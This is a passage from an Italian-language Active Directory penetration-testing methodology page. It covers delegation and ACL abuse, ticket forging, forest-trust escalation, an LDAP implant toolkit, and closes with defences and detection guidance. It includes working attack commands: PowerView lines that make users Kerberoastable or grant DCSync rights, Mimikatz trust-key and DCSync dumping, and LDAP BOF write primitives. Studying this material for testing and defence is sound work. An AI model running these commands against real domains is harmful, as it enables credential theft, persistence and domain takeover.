Le suite di inventory e deployment di terze parti spesso espongono percorsi potenti verso le credenziali e l'esecuzione di codice. Vedi:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Se trovi un oggetto Computer con l'attributo [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) e disponi di privilegi di dominio sul computer, potrai eseguire il dump dei TGT dalla memoria di ogni utente che effettua il login sul computer.\
Quindi, se un **Domain Admin effettua il login sul computer**, potrai eseguire il dump del suo TGT e impersonarlo usando [Pass the Ticket](pass-the-ticket.md).\
Grazie alla constrained delegation potresti persino **compromettere automaticamente un Print Server** (si spera che sia un DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Se un utente o un computer è autorizzato per la "Constrained Delegation", sarà in grado di **impersonare qualsiasi utente per accedere ad alcuni servizi su un computer**.\
Quindi, se **comprometti l'hash** di questo utente/computer, sarai in grado di **impersonare qualsiasi utente** (anche i domain admin) per accedere ad alcuni servizi.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Avere il privilegio **WRITE** su un oggetto Active Directory di un computer remoto consente di ottenere l'esecuzione di codice con **privilegi elevati**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

L'utente compromesso potrebbe avere alcuni **privilegi interessanti su determinati oggetti di dominio**, che potrebbero consentirti di effettuare un **movimento** laterale o un'**escalation** dei privilegi.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Individuare un **servizio Spool in ascolto** all'interno del dominio può essere **sfruttato** per **acquisire nuove credenziali** ed effettuare un'**escalation dei privilegi**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Se **altri utenti** **accedono** alla macchina **compromessa**, è possibile **raccogliere credenziali dalla memoria** e persino **iniettare beacon nei loro processi** per impersonarli.\
Di solito gli utenti accedono al sistema tramite RDP; ecco quindi come eseguire un paio di attack sulle sessioni RDP di terze parti:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** fornisce un sistema per gestire la **password dell'Administrator locale** sui computer aggiunti al dominio, garantendo che sia **randomizzata**, univoca e **modificata** frequentemente. Queste password sono archiviate in Active Directory e l'accesso è controllato tramite ACL, consentendolo solo agli utenti autorizzati. Con permessi sufficienti per accedere a queste password, diventa possibile effettuare il pivot verso altri computer.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Raccogliere certificati** dalla macchina compromessa potrebbe essere un modo per effettuare un'escalation dei privilegi all'interno dell'ambiente:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Se sono configurati **template vulnerabili**, è possibile abusarne per effettuare un'escalation dei privilegi:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Una volta ottenuti i privilegi di **Domain Admin** o, ancora meglio, di **Enterprise Admin**, puoi eseguire il **dump** del **database del dominio**: _ntds.dit_.

[**Maggiori informazioni sull'attack DCSync sono disponibili qui**](dcsync.md).

[**Maggiori informazioni su come rubare NTDS.dit sono disponibili qui**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Alcune delle tecniche discusse in precedenza possono essere usate per la persistence.\
Ad esempio, potresti:

- Rendere gli utenti vulnerabili a [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Rendere gli utenti vulnerabili a [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Concedere i privilegi [**DCSync**](#dcsync) a un utente

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

L'**attack Silver Ticket** crea un **ticket legittimo Ticket Granting Service (TGS)** per un servizio specifico usando l'**hash NTLM** (ad esempio, l'**hash dell'account del PC**). Questo metodo viene usato per **accedere ai privilegi del servizio**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Un'**attack Golden Ticket** implica che un attaccante ottenga l'**hash NTLM dell'account krbtgt** in un ambiente Active Directory (AD). Questo account è speciale perché viene usato per firmare tutti i **Ticket Granting Ticket (TGT)**, essenziali per l'autenticazione all'interno della rete AD.

Una volta ottenuto questo hash, l'attaccante può creare **TGT** per qualsiasi account scelga (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Sono simili ai golden ticket, ma contraffatti in modo da **eludere i comuni meccanismi di rilevamento dei golden ticket.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Avere i certificati di un account o poterli richiedere** è un ottimo modo per mantenere la persistence nell'account dell'utente (anche se cambia la password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Usando i certificati è anche possibile mantenere la persistence con privilegi elevati all'interno del dominio:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

L'oggetto **AdminSDHolder** in Active Directory garantisce la sicurezza dei **gruppi privilegiati** (come Domain Admins ed Enterprise Admins) applicando una **Access Control List (ACL)** standard a questi gruppi, per impedire modifiche non autorizzate. Tuttavia, questa funzionalità può essere sfruttata: se un attaccante modifica l'ACL di AdminSDHolder per concedere accesso completo a un utente normale, quest'ultimo ottiene un controllo esteso su tutti i gruppi privilegiati. Questa misura di sicurezza, pensata per proteggere, può quindi ritorcersi contro, consentendo accessi non autorizzati se non viene monitorata attentamente.

[**Maggiori informazioni sul gruppo AdminDSHolder sono disponibili qui.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

All'interno di ogni **Domain Controller (DC)** esiste un account **local administrator**. Ottenendo i diritti di amministratore su una macchina di questo tipo, è possibile estrarre l'hash dell'Administrator locale usando **mimikatz**. Successivamente, è necessaria una modifica del registro per **abilitare l'uso di questa password**, consentendo l'accesso remoto all'account Administrator locale.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Potresti **concedere** alcune **autorizzazioni speciali** a un **utente** su determinati oggetti di dominio, consentendogli di **effettuare un'escalation dei privilegi in futuro**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

I **security descriptor** vengono usati per **archiviare** i **permessi** che un **oggetto** possiede **su** un altro **oggetto**. Se puoi semplicemente **apportare** una **piccola modifica** al **security descriptor** di un oggetto, puoi ottenere privilegi molto interessanti su quell'oggetto senza dover essere membro di un gruppo privilegiato.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Abusa della classe ausiliaria `dynamicObject` per creare principal/GPO/record DNS di breve durata con `entryTTL`/`msDS-Entry-Time-To-Die`; si eliminano autonomamente senza tombstone, cancellando le evidenze LDAP, ma lasciando SID orfani, riferimenti `gPLink` non validi o risposte DNS memorizzate nella cache (ad esempio, contaminazione degli ACE di AdminSDHolder o redirect `gPCFileSysPath`/DNS integrati in AD dannosi).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Modifica **LSASS** in memoria per stabilire una **password universale**, concedendo l'accesso a tutti gli account del dominio.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Scopri qui cos'è un SSP (Security Support Provider).](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Puoi creare un **SSP personalizzato** per **catturare** in **testo in chiaro** le **credenziali** usate per accedere alla macchina.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Registra un **nuovo Domain Controller** nell'AD e lo usa per **inviare attributi** (SIDHistory, SPN...) agli oggetti specificati **senza lasciare alcun **log** relativo alle **modifiche**. Sono necessari privilegi **DA** e devi trovarti nel **root domain**.\
Nota che, se usi dati errati, compariranno log piuttosto compromettenti.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

In precedenza abbiamo discusso di come effettuare un'escalation dei privilegi se hai **permessi sufficienti per leggere le password LAPS**. Tuttavia, queste password possono essere usate anche per **mantenere la persistence**.\
Vedi:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft considera la **Forest** il confine di sicurezza. Ciò implica che **compromettere un singolo dominio potrebbe potenzialmente portare alla compromissione dell'intera Forest**.<sup>[[1]](#references)</sup>

### Basic Information

Un [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) è un meccanismo di sicurezza che consente a un utente di un **dominio** di accedere alle risorse di un altro **dominio**. Crea essenzialmente un collegamento tra i sistemi di autenticazione dei due domini, consentendo alle verifiche di autenticazione di fluire senza problemi. Quando i domini configurano una relazione di trust, scambiano e conservano **chiavi** specifiche all'interno dei rispettivi **Domain Controller (DC)**, fondamentali per l'integrità della relazione di trust.

In uno scenario tipico, se un utente intende accedere a un servizio in un **trusted domain**, deve prima richiedere uno speciale ticket, noto come **inter-realm TGT**, al DC del proprio dominio. Questo TGT è cifrato con una **chiave** condivisa concordata da entrambi i domini. L'utente presenta quindi questo TGT al **DC del trusted domain** per ottenere un service ticket (**TGS**). Dopo la convalida dell'inter-realm TGT da parte del DC del trusted domain, quest'ultimo emette un TGS, concedendo all'utente l'accesso al servizio.

**Passaggi**:

1. Un **computer client** nel **Domain 1** avvia il processo usando il proprio **hash NTLM** per richiedere un **Ticket Granting Ticket (TGT)** al proprio **Domain Controller (DC1)**.
2. DC1 emette un nuovo TGT se il client viene autenticato correttamente.
3. Il client richiede quindi un **inter-realm TGT** a DC1, necessario per accedere alle risorse nel **Domain 2**.
4. L'inter-realm TGT viene cifrato con una **trust key** condivisa tra DC1 e DC2 nell'ambito della relazione di trust bidirezionale tra i domini.
5. Il client porta l'inter-realm TGT al **Domain Controller (DC2) del Domain 2**.
6. DC2 verifica l'inter-realm TGT usando la trust key condivisa e, se valido, emette un **Ticket Granting Service (TGS)** per il server del Domain 2 a cui il client vuole accedere.
7. Infine, il client presenta questo TGS al server, cifrato con l'hash dell'account del server, per ottenere l'accesso al servizio nel Domain 2.

### Different trusts

È importante notare che **una relazione di trust può essere unidirezionale o bidirezionale**. Nelle opzioni bidirezionali, entrambi i domini si considerano attendibili a vicenda; nella relazione di trust **unidirezionale**, invece, uno dei domini sarà il **trusted** e l'altro il **trusting domain**. In quest'ultimo caso, **potrai accedere alle risorse all'interno del trusting domain solo dal trusted domain**.

Se il Domain A considera attendibile il Domain B, A è il trusting domain e B è il trusted domain. Inoltre, nel **Domain A**, questa sarà una relazione di trust **Outbound**; nel **Domain B**, sarà una relazione di trust **Inbound**.

**Diverse relazioni di trust**

- **Parent-Child Trusts**: è una configurazione comune all'interno della stessa forest, in cui un child domain dispone automaticamente di una relazione di trust transitiva e bidirezionale con il parent domain. Ciò significa che le richieste di autenticazione possono fluire senza problemi tra parent e child.
- **Cross-link Trusts**: dette anche "shortcut trusts", vengono stabilite tra child domain per accelerare i processi di referral. Nelle forest complesse, i referral di autenticazione devono normalmente risalire fino alla forest root e poi scendere fino al dominio di destinazione. Creando cross-link, il percorso viene abbreviato, con vantaggi soprattutto negli ambienti geograficamente distribuiti.
- **External Trusts**: vengono configurate tra domini diversi e non correlati e sono non transitive per natura. Secondo la [documentazione Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), le external trust sono utili per accedere a risorse in un dominio esterno alla forest corrente che non è collegato tramite una forest trust. La sicurezza viene rafforzata tramite il SID filtering con le external trust.
- **Tree-root Trusts**: queste relazioni di trust vengono stabilite automaticamente tra il forest root domain e un nuovo tree root aggiunto. Sebbene non siano comuni, le tree-root trust sono importanti per aggiungere nuovi alberi di dominio a una forest, consentendo loro di mantenere un nome di dominio univoco e garantendo la transitività bidirezionale. Maggiori informazioni sono disponibili nella [guida Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: questo tipo di trust è una relazione di trust transitiva e bidirezionale tra due forest root domain e applica inoltre il SID filtering per rafforzare le misure di sicurezza.
- **MIT Trusts**: queste relazioni di trust vengono stabilite con domini Kerberos non Windows e [conformi a RFC4120](https://tools.ietf.org/html/rfc4120). Le MIT trust sono più specializzate e adatte agli ambienti che richiedono l'integrazione con sistemi basati su Kerberos al di fuori dell'ecosistema Windows.

#### Altre differenze nelle **relazioni di trust**

- Una relazione di trust può anche essere **transitiva** (A considera attendibile B, B considera attendibile C, quindi A considera attendibile C) o **non transitiva**.
- Una relazione di trust può essere configurata come **bidirezionale** (entrambi si considerano attendibili a vicenda) o **unidirezionale** (solo uno dei due considera attendibile l'altro).

### Attack Path

1. **Enumerare** le relazioni di trust
2. Verificare se qualche **security principal** (utente/gruppo/computer) ha **accesso** alle risorse dell'**altro dominio**, magari tramite voci ACE o perché appartiene a gruppi dell'altro dominio. Cercare **relazioni tra domini** (probabilmente la relazione di trust è stata creata proprio per questo).
1. In questo caso, il kerberoast potrebbe essere un'altra opzione.
3. **Compromettere** gli **account** che possono effettuare il **pivot** tra i domini.

Gli attaccanti potrebbero accedere alle risorse di un altro dominio tramite tre meccanismi principali:

- **Local Group Membership**: i principal possono essere aggiunti a gruppi locali sui computer, come il gruppo “Administrators” su un server, ottenendo un controllo significativo su quel computer.
- **Foreign Domain Group Membership**: i principal possono anche essere membri di gruppi all'interno del dominio esterno. Tuttavia, l'efficacia di questo metodo dipende dalla natura della relazione di trust e dall'ambito del gruppo.
- **Access Control Lists (ACLs)**: i principal possono essere specificati in una **ACL**, in particolare come entità negli **ACE** all'interno di una **DACL**, ottenendo l'accesso a risorse specifiche. Per chi desidera approfondire il funzionamento di ACL, DACL e ACE, il whitepaper intitolato “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” è una risorsa preziosa.<sup>[[17]](#references)</sup>

### Find external users/groups with permissions

Puoi controllare **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** per trovare i foreign security principal nel dominio. Si tratta di utenti/gruppi di **un dominio/forest esterno**.

Puoi verificarlo in **Bloodhound** o usando powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Escalation dei privilegi da Child a Parent nella forest
```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Altri modi per enumerare i trust del dominio:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Esistono **2 chiavi attendibili**, una per _Child --> Parent_ e un'altra per _Parent_ --> _Child_.\
> Puoi ottenere quella utilizzata dal dominio attuale con:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Esegui l'escalation a Enterprise admin nel dominio child/parent sfruttando la trust con l'injection di SID-History:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Sfruttare la Configuration NC scrivibile

Comprendere come sfruttare la Configuration Naming Context (NC) è fondamentale. La Configuration NC funge da repository centrale per i dati di configurazione in una forest negli ambienti Active Directory (AD). Questi dati vengono replicati su ogni Domain Controller (DC) della forest, mentre i DC scrivibili mantengono una copia scrivibile della Configuration NC. Per sfruttarla, è necessario disporre di **privilegi SYSTEM su un DC**, preferibilmente un child DC.

**Collegare una GPO al sito del DC root**

Il container Sites della Configuration NC include informazioni sui siti di tutti i computer aggiunti al dominio nella forest AD. Operando con privilegi SYSTEM su qualsiasi DC, gli attaccanti possono collegare GPO ai siti dei DC root. Questa azione può compromettere il dominio root manipolando le policy applicate a tali siti.

Per informazioni più approfondite, è possibile consultare la ricerca su [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Compromettere qualsiasi gMSA nella forest**

Un vettore di attacco consiste nel prendere di mira i gMSA privilegiati all'interno del dominio. La chiave root KDS, essenziale per calcolare le password dei gMSA, è archiviata nella Configuration NC. Con privilegi SYSTEM su qualsiasi DC, è possibile accedere alla chiave root KDS e calcolare le password di qualsiasi gMSA nella forest.

Un'analisi dettagliata e una guida passo-passo sono disponibili in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Attacco MSA delegato complementare (BadSuccessor – sfruttamento degli attributi di migrazione):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Ricerca esterna aggiuntiva: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Attacco di modifica dello Schema**

Questo metodo richiede pazienza, aspettando la creazione di nuovi oggetti AD privilegiati. Con privilegi SYSTEM, un attaccante può modificare lo Schema AD per concedere a qualsiasi utente il controllo completo su tutte le classi. Ciò potrebbe portare ad accesso e controllo non autorizzati sui nuovi oggetti AD creati.

Ulteriori informazioni sono disponibili in [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**Da DA a EA con ADCS ESC5**

La vulnerabilità ADCS ESC5 prende di mira il controllo sugli oggetti della Public Key Infrastructure (PKI) per creare un certificate template che consenta l'autenticazione come qualsiasi utente all'interno della forest. Poiché gli oggetti PKI risiedono nella Configuration NC, compromettere un child DC scrivibile consente di eseguire attacchi ESC5.

Ulteriori dettagli sono disponibili in [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> Negli scenari privi di ADCS, l'attaccante può configurare i componenti necessari, come illustrato in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### Dominio di una forest esterna - One-Way (Inbound) o bidirezionale
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
In questo scenario **il tuo dominio è considerato attendibile** da un dominio esterno, che ti concede **permessi non determinati** su di esso. Dovrai trovare **quali principal del tuo dominio dispongono di quale livello di accesso sul dominio esterno** e poi provare a sfruttarlo:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Dominio di una foresta esterna - Unidirezionale (in uscita)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In questo scenario **il tuo dominio** sta **affidando** alcuni **privilegi** a un principal di **domini differenti**.

Tuttavia, quando un **dominio è considerato trusted** dal dominio trusting, il dominio trusted **crea un utente** con un **nome prevedibile** che utilizza come **password la password del trusted**. Ciò significa che è possibile **accedere a un utente del dominio trusting per entrare in quello trusted**, enumerarlo e provare a ottenere ulteriori privilegi:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Un altro modo per compromettere il dominio trusted consiste nel trovare un [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) creato nella **direzione opposta** rispetto al trust tra i domini (cosa non molto comune).

Un altro modo per compromettere il dominio trusted consiste nell'attendere su una macchina a cui **un utente del dominio trusted può accedere**, affinché effettui il login tramite **RDP**. L'attaccante potrebbe quindi iniettare codice nel processo della sessione RDP e **accedere al dominio di origine della vittima** da lì.\
Inoltre, se la **vittima ha montato il proprio hard drive**, dal processo della **sessione RDP** l'attaccante potrebbe memorizzare **backdoors** nella **startup folder dell'hard drive**. Questa tecnica è chiamata **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigazione dell'abuso dei trust tra domini

### **SID Filtering:**

- Il rischio degli attacchi che sfruttano l'attributo SID history attraverso i forest trust è mitigato dal SID Filtering, attivato per impostazione predefinita su tutti gli inter-forest trust. Ciò si basa sul presupposto che gli intra-forest trust siano sicuri, considerando la forest, anziché il dominio, come security boundary, secondo la posizione di Microsoft.
- Tuttavia, c'è un problema: il SID filtering potrebbe interrompere applicazioni e accesso degli utenti, portando alla sua disattivazione occasionale.

### **Selective Authentication:**

- Per gli inter-forest trust, l'utilizzo della Selective Authentication garantisce che gli utenti delle due forest non vengano autenticati automaticamente. Sono invece necessarie autorizzazioni esplicite affinché gli utenti possano accedere ai domini e ai server all'interno del dominio o della forest trusting.
- È importante notare che queste misure non proteggono dallo sfruttamento del Writable Configuration Naming Context (NC) o dagli attacchi all'account del trust.

[**Maggiori informazioni sui trust tra domini su ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## Abuso di AD basato su LDAP da impianti on-host

La [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implementa le primitive LDAP in stile bloodyAD come Beacon Object Files x64 che vengono eseguiti interamente all'interno di un impianto on-host (ad esempio, Adaptix C2). Gli operatori compilano il pack con `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, caricano `ldap.axs` e poi eseguono `ldap <subcommand>` dal beacon. Tutto il traffico utilizza il contesto di sicurezza del logon corrente tramite LDAP (389) con signing/sealing o LDAPS (636) con auto certificate trust, quindi non sono necessari socks proxy o artefatti su disco.<sup>[[4]](#references)</sup>

### Enumerazione LDAP lato impianto

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` e `get-groupmembers` risolvono short names/percorsi OU in DN completi ed estraggono gli oggetti corrispondenti.
- `get-object`, `get-attribute` e `get-domaininfo` recuperano attributi arbitrari (inclusi i security descriptor), oltre ai metadati della forest/dominio da `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` e `get-rbcd` espongono direttamente da LDAP i candidati al roasting, le impostazioni di delegation e i descriptor esistenti di [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).
- `get-acl` e `get-writable --detailed` analizzano la DACL per elencare trustee, diritti (GenericAll/WriteDACL/WriteOwner/scritture di attributi) ed ereditarietà, fornendo obiettivi immediati per la privilege escalation tramite ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Primitive LDAP di scrittura per escalation e persistenza

- I BOF per la creazione di oggetti (`add-user`, `add-computer`, `add-group`, `add-ou`) consentono all'operatore di predisporre nuovi principal o account macchina ovunque siano presenti diritti sull'OU. `add-groupmember`, `set-password`, `add-attribute` e `set-attribute` permettono di dirottare direttamente i target una volta individuati i diritti write-property.
- I comandi incentrati sulle ACL, come `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` e `add-dcsync`, trasformano WriteDACL/WriteOwner su qualsiasi oggetto AD in reset delle password, controllo dell'appartenenza ai gruppi o privilegi di replica DCSync, senza lasciare artefatti PowerShell/ADSI. Le controparti `remove-*` ripuliscono gli ACE iniettati.

### Delegation, roasting e abuso di Kerberos

- `add-spn`/`set-spn` rendono immediatamente un utente compromesso soggetto a Kerberoasting; `add-asreproastable` (toggle UAC) lo contrassegna per l'AS-REP roasting senza modificare la password.
- Le macro di delegation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) riscrivono `msDS-AllowedToDelegateTo`, i flag UAC o `msDS-AllowedToActOnBehalfOfOtherIdentity` dal beacon, abilitando i percorsi di attacco constrained/unconstrained/RBCD ed eliminando la necessità di PowerShell remoto o RSAT.

### Iniezione di sidHistory, ricollocazione delle OU e modellazione della superficie di attacco

- `add-sidhistory` inietta SID privilegiati nella cronologia SID di un principal controllato (vedere [SID-History Injection](sid-history-injection.md)), fornendo l'ereditarietà furtiva degli accessi interamente tramite LDAP/LDAPS.
- `move-object` modifica il DN/OU di computer o utenti, consentendo a un attaccante di spostare gli asset in OU dove esistono già diritti delegati, prima di abusare di `set-password`, `add-groupmember` o `add-spn`.
- I comandi di rimozione strettamente circoscritti (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, ecc.) consentono un rapido rollback dopo che l'operatore ha raccolto credenziali o ottenuto persistenza, riducendo al minimo la telemetria.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Alcune difese generali

[**Scopri di più su come proteggere le credenziali qui.**](../stealing-credentials/credentials-protections.md)

### **Misure difensive per la protezione delle credenziali**

- **Restrizioni per Domain Admins**: è consigliabile consentire ai Domain Admins di effettuare il login solo sui Domain Controller, evitando il loro utilizzo su altri host.
- **Privilegi degli account di servizio**: i servizi non dovrebbero essere eseguiti con privilegi Domain Admin (DA), per mantenere la sicurezza.
- **Limitazione temporale dei privilegi**: per le attività che richiedono privilegi DA, la loro durata dovrebbe essere limitata. È possibile farlo con: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Mitigazione del LDAP relay**: eseguire l'audit degli Event ID 2889/3074/3075, quindi imporre LDAP signing e il channel binding LDAPS su DC/client per bloccare i tentativi di LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Fingerprinting a livello di protocollo delle attività di Impacket

Se vuoi rilevare le tecniche comuni di AD, **non fare affidamento soltanto sugli artefatti controllati dall'operatore**, come binari rinominati, nomi di servizi, file batch temporanei o percorsi di output. Crea una baseline del modo in cui i client Windows legittimi generano traffico [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC e WMI, quindi cerca le **particolarità di implementazione** che rimangono anche dopo che l'operatore modifica `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` o `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Candidati standalone ad alta affidabilità** (dopo averli convalidati rispetto alla propria baseline):
- DCE/RPC autenticato che utilizza `auth_context_id = 79231 + ctx_id`
- Padding dell'autenticazione DCE/RPC riempito con `0xff`
- Bind Kerberos LDAP che inseriscono un `AP-REQ` Kerberos raw direttamente in `mechToken` SPNEGO
- Richieste negotiate SMB2/3 con valori `ClientGuid` dall'aspetto ASCII
- `IWbemLevel1Login::NTLMLogin` WMI che utilizza il namespace non standard `//./root/cimv2`
- Valori nonce Kerberos hardcoded
- **Più adatti come elementi di correlazione/punteggio**:
- Liste di etype Kerberos sparse o duplicate, `PA-DATA` insoliti/assenti o ordinamento degli etype TGS-REQ diverso da quello del Windows nativo
- Messaggi NTLM Type 1 privi di informazioni sulla versione o messaggi Type 3 con nomi host null
- NTLMSSP raw trasportato in DCE/RPC invece che in SPNEGO, trailer di verifica DCE/RPC mancanti o mismatch degli OID SPNEGO/Kerberos
- Diverse di queste caratteristiche provenienti dallo stesso host/utente/sessione/intervallo temporale sono molto più indicative di qualsiasi singolo campo debole
- **Da utilizzare come arricchimento, non come alert standalone**:
- Nomi di file predefiniti, percorsi di output, nomi di servizi casuali, nomi di batch temporanei, nomi predefiniti degli account computer e stringhe HTTP/WebDAV/RDP/MSSQL specifiche degli strumenti
- Sono facili da modificare per gli operatori e vanno usati soprattutto per spiegare perché un cluster cross-protocol è sospetto
- **Note operative**:
- Alcuni di questi segnali richiedono traffico decrittografato, [analisi PCAP/Zeek](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW o visibilità lato servizio
- Convalidare i risultati rispetto a client Samba/Linux, appliance e software legacy prima di trasformarli in alert
- Promuovere le detection da arricchimento -> hunting -> alerting man mano che aumenta la fiducia nella baseline

### **Implementazione di tecniche di deception**

- L'implementazione della deception consiste nel predisporre trappole, come utenti o computer esca, con caratteristiche quali password che non scadono o account contrassegnati come Trusted for Delegation. Un approccio dettagliato include la creazione di utenti con diritti specifici o la loro aggiunta a gruppi con privilegi elevati.<sup>[[2]](#references)</sup>
- Un esempio pratico consiste nell'utilizzare strumenti come: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Ulteriori informazioni sull'implementazione delle tecniche di deception sono disponibili in [Deploy-Deception su GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identificazione della deception**

- **Per gli oggetti utente**: gli indicatori sospetti includono ObjectSID atipici, accessi poco frequenti, date di creazione e un numero ridotto di password errate.
